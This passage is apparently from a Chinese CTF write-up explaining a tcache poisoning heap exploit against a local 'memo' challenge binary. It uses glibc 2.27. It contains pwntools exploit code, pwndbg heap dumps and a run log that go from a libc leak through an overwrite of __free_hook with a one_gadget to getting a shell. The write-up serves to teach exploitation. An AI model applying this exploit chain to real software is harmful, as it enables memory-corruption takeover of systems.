+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000000	0x0000000000000051 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5(free now)
+0x56064e1183b0:	0x000056064e1183b0	0x0000000000000091
+    			#next指针指向其自身
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  4]: 0x56064e1183b0 ◂— 0x56064e1183b0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+### 设置chunk5的next指针，让其指向0x91的fake_chunk1
+接下来我们设置chunk5的next指针，让其指向其中一个大小为0x91的fake_chunk。
+
+因为tcachebin中有4个free_chunk，但是实际上只有一个free_chunk5。
+
+```python
+# Set FD to one of the fake 0x91 chunks
+add(p64(heap_leak + 0x60)) # count = 3
+add('B'*8) # count = 2
+add('B'*8) # Got a 0x91 chunk, count = 1
+```
+
+> heap_leak=0x000056064e118270
+>
+> heap_leak+0x60=0x000056064e1182d0 #地址为chunk2的内容
+>
+
+由于tcache中只有chunk5，因此第一个add是更改chunk5的next指针，让其指向大小为0x91的fake_chunk。
+
+执行add(p64(heap_leak + 0x60))之后的结果如下:（tcache_poisoning）
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+fd: 0x4141414141414141
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118350
+Size: 0x51
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+fd: 0x56064e1182d0
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251  #tcache_perthread_struct
+0x56064e117010:	0x0000000003000000	0x0000000000000000
+    			#count=3
+......（省略内容均为空）
+0x56064e117060:	0x0000000000000000	0x000056064e1183b0
+......（省略内容均为空）
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x000056064e1182d0	0x000000000000000a
+0x56064e117270:	0x000056064e118270	0x0000000000000091 #fake_chunk2
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......（省略内容均为空）
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091
+0x56064e1182d0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+    			#指向fake_chunk2
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000000	0x0000000000000051 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5
+0x56064e1183b0:	0x000056064e1182d0	0x000000000000000a
+    			#chunk5next指针，指向0x91的fake_chunk
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......（省略内容均为空）
+0x55c5ec9888f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  3]:  0x56064e1183b0 —▸ 0x56064e1182d0 —▸ 0x56064e118270 ◂— 'AAAAAAAA'
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+还记得之前提到的tcachebins 0x50 [count]:混乱吗？
+
+我们修改了chunk5的指针之后，count的数目就自动被修复了，也就是说堆的管理机制会根据tcache中count的数目来关联free chunk。
+
+由于tcachebins中最后放入的chunk地址为0x56064e1183b0，因此程序执行add('B'*8)之后会使用chunk5:
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+fd: 0x4141414141414141
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118350
+Size: 0x51
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+fd: 0x56064e1182d0
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251  #tcache_perthread_struct
+0x56064e117010:	0x0000000003000000	0x0000000000000000
+    			#count=3
+......（省略内容均为空）
+0x56064e117060:	0x0000000000000000	0x000056064e1182d0
+    								#指向fake_chunk1
+......（省略内容均为空）
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4242424242424242	0x000000000000000a
+0x56064e117270:	0x000056064e118270	0x0000000000000091 #fake_chunk2
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......（省略内容均为空）
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091
+0x56064e1182d0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+    			#指向fake_chunk2
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000000	0x0000000000000051 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5
+0x56064e1183b0:	0x4242424242424242	0x000000000000000a
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......（省略内容均为空）
+0x55c5ec9888f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  2]:  0x56064e1182d0 —▸ 0x56064e118270 ◂— 'AAAAAAAA'
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+同理，再次执行add('B'*8)，程序会使用地址为0x56064e1182d0的fake_chunk1：
+
+```python
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000001000000	0x0000000000000000
+......(省略内容均为空)
+0x56064e117060:	0x0000000000000000	0x000056064e118270
+    								#指向chunk1_data
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4242424242424242	0x000000000000000a
+0x56064e117270:	0x000056064e118270	0x0000000000000091 #fake_chunk2
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+---------------------------------------------------------------------
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182d0:	0x4242424242424242	0x0000000000000000 
+---------------------------------------------------------------------
+之前的内存：
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091
+0x56064e1182d0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+为什么在add之后0x56064e1182d8处的内容会变为0x0000000000000000
+这是因为在tcache中的链表指针是指向下一个chunk的fd字段，并不是fastbin的链表指针
+指向下一个chunk的pre_size字段，因此malloc之后fake_chunk1的位置会“移动”，从而
+“0x56064e1182d8”处的内容会变为0x0000000000000000
+---------------------------------------------------------------------
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000000	0x0000000000000051 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5
+0x56064e1183b0:	0x4242424242424242	0x0000000000000000
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+    			#指向chunk1_data
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+fd: 0x4141414141414141
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118350
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> bin
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+> tcachebins中现在只有一个chunk--chunk1
+>
+
+### 利用unsortedbin泄露libc基地址
+看到这里你可能感到一些疑惑：为什么要伪造大小为0x91的fake_chunk？之后会提到
+
+来看一下这时程序bss段中memo指针变量：
+
+```python
+pwndbg> x/4gx &memo
+0x????????????:<memo>:	0x000056064e1182d0	0x0000000000000000
+    					#指向fake_chunk1
+0x????????????:	0x0000000000000000	0x0000000000000000
+pwndbg>
+```
+
+由于这时memo指针指向fake_chunk1，接下来的对chunk进行7次free来是针对fake_chunk1的，以此来填满tcache_bin。
+
+```python
+# Free 7 times to fill up tcache bin, 8th one goes into unsorted bin
+for i in range(8):
+    free()
+
+# Unsorted bin libc leak
+show()
+leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+libc.address = leak - 0x3ebca0 # Offset found using gdb
+```
+
+```python
+free之前：
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+-----------------------------------------------------------------------------
+第二次free后：
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  2]: 0x56064e1182d0 ◂— 0x56064e1182d0
+-----------------------------------------------------------------------------
+第四次free后：
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  4]: 0x56064e1182d0 ◂— 0x56064e1182d0
+-----------------------------------------------------------------------------
+第六次free后：
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  6]: 0x56064e1182d0 ◂— 0x56064e1182d0
+-----------------------------------------------------------------------------
+第八次free后：
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+```
+
+由于在free7次之后，tcache的0x90链已满，但是0x90大小的chunk并不符合fastbin的大小，因此第8次free之后会放入unsortedbin中，这也就是我们为什么要伪造大小为0x91的fake_chunk。
+
+第八次free之后的chunk将进入unsortedbin，当chunk进入unsortedbin之后，打印其memo就会泄露libc的地址：
+
+free之后内存如下：
+
+```python
+pwndbg> x/4gx &memo
+0x????????????:<memo>:	0x000056064e1182d0	0x0000000000000000
+    					#指向fake_chunk1
+0x????????????:	0x0000000000000000	0x0000000000000000
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+fd: 0x4141414141414141
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk
+Addr: 0x56064e118350
+Size: 0x50
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0700000001000000	0x0000000000000000
+......(省略内容均为空)
+0x56064e117060:	0x0000000000000000	0x000056064e118270
+0x56064e117070:	0x0000000000000000	0x0000000000000000
+0x56064e117080:	0x0000000000000000	0x000056064e1182d0
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4141414141410a33	0x000000000000000a
+0x56064e117270:	0x000056064e118270	0x0000000000000091
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182d0:	0x00007fed0a333ca0	0x00007fed0a333ca0
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000090	0x0000000000000050 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5
+0x56064e1183b0:	0x4141414141414141	0x0000000000000000
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+在执行打印函数之后就会打印处libc的地址。
+
+## 为getshell做好准备
+### 计算重要函数的地址
+这个步骤主要计算的是system函数的地址，但是这篇文章的的payload使用的是one_gadget，因此这个步骤着重的计算的是__free_hook函数的地址。
+
+```python
+free_hook = libc.symbols['__free_hook']
+system = libc.symbols['system']
+
+log.info('Libc leak: ' + hex(leak))
+log.info('Libc base: ' + hex(libc.address))
+log.info('__free_hook: ' + hex(free_hook))
+log.info('system: ' + hex(system))
+```
+
+### 申请可用内存到__free_hook
+申请前bin的状况：
+
+```python
+pwndbg> bin
+tcachebins
+0x50 [  1]: 0x56064e118270 ◂— 'AAAAAAAA'
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+此部分的payload如下：
+
+```python
+# Tcache poisoning attack to overwrite __free_hook with system
+add('C'*8) # count = 0
+free()
+free()
+
+# Overwrite __free_hook with system
+add(p64(free_hook))
+add(p64(0))
+#add(p64(system))
+```
+
+由于tcachebins中的0x50链上还有free chunk，因此add('C'*8)之后会使用chunk1这片空间：
+
+```python
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0700000001000000	0x0000000000000000
+......(省略内容均为空)
+0x56064e117060:	0x0000000000000000	0x000056064e118270
+0x56064e117070:	0x0000000000000000	0x0000000000000000
+0x56064e117080:	0x0000000000000000	0x000056064e1182d0
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4141414141410a33	0x000000000000000a
+0x56064e117270:	0x000056064e118270	0x0000000000000091
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4343434343434343	0x4141414141410000
+    			#执行add函数之后修改了这里
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091 #fake_chunk1
+0x56064e1182d0:	0x00007fed0a333ca0	0x00007fed0a333ca0
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000090	0x0000000000000050 #chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #chunk5
+0x56064e1183b0:	0x4141414141414141	0x0000000000000000
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  0]: 0x4141414141414141 ('AAAAAAAA')
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> x/4gx &memo
+0x???????????? <memo>:	0x000056064e118270	0x0000000000000000
+    					#指向chunk1_data
+0x????????????:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+```
+
+两次free后的内存状况如下：
+
+```python
+pwndbg> bin
+tcachebins
+0x50 [  2]: 0x56064e118270 ◂— 0x56064e118270
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+在add(p64(free_hook))之前，tcachebins上有两条相同的chunk，因此再次malloc之后肯定会使用tcachebins的0x50链上的free chunk，add的同时也就相当于修改了bin中的next指针。其结果就是会将__free_hook这片内存区域加入到tcachebin中。
+
+```python
+pwndbg> bin
+tcachebins
+0x50 [  1]: 0x56064e118270 —▸ 0x7fbbe4fda8e8 (__free_hook) ◂— ...
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+add(p64(0))后：
+
+```python
+pwndbg> bin
+tcachebins
+0x50 [  0]: 0x7fbbe4fda8e8 (__free_hook) ◂— ...
+0x90 [  7]: 0x56064e1182d0 —▸ 0x7fed0a333ca0 (main_arena+96) —▸ 0x56064e1183f0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x56064e1182c0 —▸ 0x7fed0a333ca0 (main_arena+96) ◂— 0x56064e1182c0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+### 向__free_hook中写入one_gadget
+好了，现在tcachebins的0x50bin中只有__free_hook，当再次申请时就可以控制__free_hook：
+
+```python
+one_gadget=[0x4f365,0x4f3c2,0x10a45c]
+payload=one_gadget[1]+libc.address
+add(p64(payload))
+```
+
+### getshell
+当执行free函数时就会调用__free_hook中的one_gadget从而getshell：
+
+```python
+free()
+p.interactive()
+```
+
+> one_gadget一共有3个，需要分别尝试。
+>
+
+## Debug_content
+```python
+ubuntu@ubuntu:~/Desktop/tcache_attack_demo$ python 1.py 
+[DEBUG] PLT 0x7d0 free
+[DEBUG] PLT 0x7e0 puts
+[DEBUG] PLT 0x7f0 __stack_chk_fail
+[DEBUG] PLT 0x800 setbuf
+[DEBUG] PLT 0x810 strchr
+[DEBUG] PLT 0x820 printf
+[DEBUG] PLT 0x830 fgets
+[DEBUG] PLT 0x840 malloc
+[DEBUG] PLT 0x850 atoi
+[DEBUG] PLT 0x860 __cxa_finalize
+[*] '/home/ubuntu/Desktop/tcache_attack_demo/one'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[DEBUG] PLT 0x21020 realloc
+[DEBUG] PLT 0x21060 __tls_get_addr
+[DEBUG] PLT 0x210a0 memalign
+[DEBUG] PLT 0x210b0 _dl_exception_create
+[DEBUG] PLT 0x210f0 __tunable_get_val
+[DEBUG] PLT 0x211a0 _dl_find_dso_for_object
+[DEBUG] PLT 0x211e0 calloc
+[DEBUG] PLT 0x212c0 malloc
+[DEBUG] PLT 0x212c8 free
+[*] '/home/ubuntu/Desktop/tcache_attack_demo/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+LOCAL PROCESS
+[+] Starting local process './one' argv=['./one'] : pid 6306
+[DEBUG] Received 0x53 bytes:
+    'just one\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x3f bytes:
+    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
